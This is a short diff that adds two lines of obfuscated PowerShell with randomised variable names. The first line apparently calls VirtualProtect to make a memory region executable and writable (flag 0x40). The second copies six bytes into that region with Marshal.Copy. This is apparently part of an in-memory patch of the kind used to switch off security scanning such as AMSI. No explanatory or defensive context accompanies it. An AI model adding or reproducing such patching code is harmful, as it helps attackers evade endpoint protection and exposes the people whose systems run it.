@@ -1,0 +1,2 @@
+$qHuYGzrAkQUeUiCJYvvRWxVpmguSXJnQGjGaol.Invoke($RzYQpMtZuJCZQzlKmSfQTeEavtzZTPCObTtejYIK, [uint32]5, 0x40, [ref]$hxarwCPKRymjvICeibDN)
+[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $RzYQpMtZuJCZQzlKmSfQTeEavtzZTPCObTtejYIK, 6)
